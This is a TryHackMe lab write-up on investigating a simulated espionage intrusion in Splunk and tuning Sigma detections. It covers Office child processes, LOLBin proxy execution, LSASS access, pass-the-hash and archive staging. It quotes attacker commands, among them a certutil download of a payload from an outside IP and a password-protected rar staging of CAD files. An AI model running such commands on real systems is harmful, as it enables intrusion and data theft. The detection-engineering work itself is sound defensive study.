@@ -1,0 +1,140 @@
+# DetectMare — TryHackMe Write-up
+
+## Objective
+Investigate an espionage intrusion and repair five Sigma detections using Splunk and a Detection-as-Code workflow. The focus was not just matching the original attack, but reducing false positives and testing alternative attacker behavior.
+
+## Tools Used
+- Splunk SPL — event investigation and process tracing
+- Sigma — portable detection logic
+- Sysmon — process creation and process access telemetry
+- Windows Security and System logs — authentication and service installation
+- DaC application — pull requests, rule conversion, environment validation, and automated red-team tests
+
+## Investigation
+The lab incident report described activity consistent with APT21 against the fictional Meridian Defense Research Institute. I treated that attribution as scenario context, while using the logs to establish specific actions.
+
+The main search index was:
+
+```spl
+index="dac_lab"
+```
+
+### 1. Spearphishing and Office Child Processes
+The initial document was:
+
+```text
+Hypersonic_Test_Schedule_2025.docm
+```
+
+On RESEARCH-ENG14, Word launched cmd.exe under RESEARCH\m.okafor at 08:42:10 on March 11, 2025. The command invoked certutil to retrieve a payload:
+
+```text
+cmd.exe /c certutil -urlcache -split -f http://45.77.12.9/u.dat %TEMP%\u.dat
+```
+
+The process event showed the document path in ParentCommandLine. It established command execution, not whether the download completed successfully.
+
+The original rule matched an unrelated child executable. Broader Office-child coverage was needed, including Excel, Outlook, PowerShell, and mshta. However, legitimate finance automation also launched cmd.exe.
+
+The useful exception combined the exact automation command with its Excel template:
+
+```text
+Script: C:\ProgramData\ResearchIT\Automation\monthend_report.bat
+Template: C:\Finance\MonthEnd_Template.xlsm
+```
+
+Excluding the whole automation folder, or the script name alone, would allow bypasses.
+
+### 2. Signed Binary Proxy Execution
+The report described rundll32 and regsvr32 executing payloads from ProgramData and AppData. Payload extensions included .dat rather than only .dll.
+
+The initial detection covered only rundll32 with a ProgramData reference. It needed both proxy binaries and broader path coverage.
+
+Environmental context mattered: the internal deployment tool was researchdeploy.exe. Logs showed it launching package installation commands from:
+
+```text
+C:\Program Files\ResearchIT\Deploy\researchdeploy.exe
+```
+
+Other observed routines included SOLIDWORKS license checks and WER activity. Exceptions needed the actual parent and command context, not just a broadly trusted directory.
+
+### 3. LSASS Credential Access
+Sysmon Event ID 10 recorded rundll32 accessing LSASS at 10:20:00 under RESEARCH\m.okafor:
+
+```text
+TargetImage: C:\Windows\System32\lsass.exe
+GrantedAccess: 0x1fffff
+CallTrace: ...comsvcs.dll...|UNKNOWN(...)
+```
+
+A narrow rule detected the original event but missed red-team variants using dbghelp.dll, dbgcore.dll, and different access masks.
+
+Expanding the masks and trace indicators introduced eight false positives: four ResearchPAM vaultagent events and four WerFault events. This demonstrated why broader coverage must be paired with environment-specific tuning.
+
+The proposed exceptions combined exact source paths, source accounts, access masks, and observed traces. Those exceptions were lab-specific, not proof that the binaries could never be abused.
+
+### 4. Pass-the-Hash and Service Installation
+A suspicious network logon occurred at:
+
+```text
+3/11/2025 10:40:00.000 AM
+```
+
+The destination was FS-CLASSIFIED01.research.local, with account m.okafor and source 10.20.5.44 / RESEARCH-PC44. The event contained:
+
+```text
+Event ID: 4624
+Logon Type: 3
+Authentication Package: NTLM
+Key Length: 0
+```
+
+KeyLength 0 was a hunting signal, not standalone proof of pass-the-hash. The source workstation also differed from the earlier LSASS host, so I did not assume they were the same system.
+
+At 10:43:00, Event ID 7045 recorded WinHelpSvc pointing to:
+
+```text
+C:\ProgramData\Intel\nt.dat
+```
+
+Seven other zero-key-length NTLM events came from observed MES and cluster routines. Contextual exceptions retained the account/source/destination combinations instead of excluding service accounts globally.
+
+The combined rule detected logon OR service events; it was not a temporal correlation rule. Both Security and System telemetry were required. A subsequent red-team test also required coverage for service commands invoking encoded PowerShell through cmd.exe.
+
+### 5. Archive Collection and Staging
+At 10:50:00, the attacker ran:
+
+```text
+rar a -hpP@ssw0rd! C:\Users\Public\d.rar \\fs-classified01\designs\*.sldprt
+```
+
+The rule needed to distinguish CAD-file archiving from ordinary photo compression and authorized backups. Relevant extensions included .sldprt, .catpart, and .dwg.
+
+The nightly backup destination was:
+
+```text
+D:\Backups\nightly
+```
+
+Backup exceptions used the ResearchBackup parent and svc_backup account. SOLIDWORKS autobackups had a separate parent and destination.
+
+Red-team testing exposed a renamed archiver that bypassed executable-name checks. A command-line behavior branch was proposed to complement Image and OriginalFileName matching. Archive staging alone did not establish completed exfiltration.
+
+## Validation Workflow
+1. Read the incident report and environment routines.
+2. Examine raw events and verify extracted field names.
+3. Select the correct log source and Sigma fields.
+4. Fix YAML syntax before evaluating detection quality.
+5. Measure true positives, false positives, and false negatives.
+6. Inspect matched events before adding exceptions.
+7. Test alternative attacker behavior before approval and merge.
+
+Environment validation reached TP 2 / FP 0 / FN 0 for PR#4 and TP 1 / FP 0 / FN 0 for PR#5 in the captured runs. Both still had red-team gaps at those points. Later revisions were proposed, but the retained evidence does not establish a final all-tests-passed state for every PR.
+
+## Key Takeaways
+- Correct YAML does not guarantee correct detection logic.
+- Process creation, process access, authentication, and service installation require different fields and telemetry.
+- Avoid overfitting to one executable name, access mask, IP address, or host.
+- A familiar path or SYSTEM account is not enough to justify an exception.
+- Validate broader coverage against legitimate environmental activity.
+- Passing the original dataset does not guarantee resistance to bypasses or production readiness.
